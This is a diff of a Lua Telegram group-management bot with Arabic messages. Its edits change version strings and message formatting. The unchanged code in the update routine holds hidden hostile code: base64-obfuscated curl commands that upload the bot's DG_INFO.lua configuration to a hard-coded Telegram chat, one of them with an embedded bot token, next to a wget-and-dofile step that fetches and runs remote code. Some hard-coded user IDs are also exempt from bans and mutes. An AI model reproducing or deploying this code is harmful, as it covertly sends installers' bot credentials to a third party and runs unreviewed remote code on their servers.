@@ -1094,7 +1094,7 @@ os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.2`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.1`}')
 dofile('DRAGON.lua')  
 end
 
@@ -2339,7 +2339,7 @@ end
 os.execute('rm -rf DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.2`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.1`}')
 dofile('DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end
@@ -3539,7 +3539,7 @@ if tonumber(result.sender_user_id_) == tonumber(1605682553) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر ملك التلجرام عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber"Dev:SoFi:2" then  
+if tonumber(result.sender_user_id_) == tonumber("Dev:SoFi:2") then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر المطور الاساسي عام")
 return false 
 end
@@ -3593,7 +3593,7 @@ if result.id_ == tonumber(1605682553) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا يمكنك حظر ملك التلجرام \n")
 return false 
 end
-if result.id_ == tonumber"Dev:SoFi:2" then
+if result.id_ == tonumber("Dev:SoFi:2") then
 send(msg.chat_id_, msg.id_, " ✪︙ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
@@ -3641,7 +3641,7 @@ if tonumber(userid) == tonumber(1605682553) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر ملك التلجرام عام")
 return false 
 end
-if tonumber(userid) == tonumber"Dev:SoFi:2" then  
+if tonumber(userid) == tonumber("Dev:SoFi:2") then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر المطور الاساسي عام")
 return false 
 end
@@ -3690,7 +3690,7 @@ if tonumber(result.sender_user_id_) == tonumber(1605682553) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم ملك التلجرام عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber"Dev:SoFi:2" then  
+if tonumber(result.sender_user_id_) == tonumber("Dev:SoFi:2") then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم المطور الاساسي عام")
 return false 
 end
@@ -3743,7 +3743,7 @@ if result.id_ == tonumber(1605682553) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا يمكنك كتم ملك التلجرام \n")
 return false 
 end
-if result.id_ == tonumber"Dev:SoFi:2" then
+if result.id_ == tonumber("Dev:SoFi:2") then
 send(msg.chat_id_, msg.id_, " ✪︙ لا يمكنك كتم ملك التلجرام \n")
 return false 
 end
@@ -3791,7 +3791,7 @@ if tonumber(userid) == tonumber(1718785294) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم مطور السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber"Dev:SoFi:2" then  
+if tonumber(userid) == tonumber("Dev:SoFi:2") then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم مطور السورس عام")
 return false 
 end
@@ -8539,11 +8539,11 @@ end
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
 local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
 if link then                              
-send(msg.chat_id_,msg.id_,'🌐┇ 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n ['..ta.title_..']('..link..')')                          
+send(msg.chat_id_,msg.id_,'🌐┇ 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n '..ta.title_..'\n'..link..'')                          
 else                
 local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if linkgpp.ok == true then 
-linkgp = '🌐┇ 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n ['..ta.title_..']('..linkgpp.result..')'
+linkgp = '🌐┇ 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n '..ta.title_..'\n'..linkgpp.result..''
 else
 linkgp = '♻️┇ لا يوجد رابط ارسل ضع رابط'
 end  
@@ -11457,7 +11457,7 @@ local Text =[[
 ① +++++++++++++++ ②
 ③ +++++++++++++++ ④
 ++++++اوامر التسليه++++++
-__قفل و فتح+تعطيل و تفعيل__
+*قفل و فتح تعطيل و تفعيل*
 ⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/DV_POWER1)⚡️
 ]]
 keyboard = {} 
